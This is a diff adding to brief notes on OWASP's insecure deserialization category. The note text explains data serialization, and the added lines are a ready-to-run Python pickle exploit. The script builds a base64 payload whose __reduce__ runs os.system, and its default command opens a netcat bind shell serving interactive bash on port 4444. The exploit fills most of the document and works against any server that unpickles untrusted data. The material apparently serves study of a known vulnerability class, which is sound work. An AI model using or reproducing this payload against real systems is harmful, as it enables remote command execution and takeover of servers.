@@ -3,4 +3,23 @@ https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization
 
 When a data from a website is needed to be converted in some universal form like binary,xml etc for compatibility across internet and data communication its called data serialization. The server upon receiving the serialized data , deserialize it according to its requirement and technology being used. In this attack we can serialize our malicious data and get the server to deserialize it and execute
 
+#!/usr/bin/python
+#
+# Pickle deserialization RCE payload.
+# To be invoked with command to execute at it's first parameter.
+# Otherwise, the default one will be used.
+#
 
+import cPickle
+import os
+import sys
+import base64
+
+DEFAULT_COMMAND = "netcat -c '/bin/bash -i' -l -p 4444"
+COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND
+
+class PickleRce(object):
+    def __reduce__(self):
+        return (os.system,(COMMAND,))
+
+print base64.b64encode(cPickle.dumps(PickleRce()))
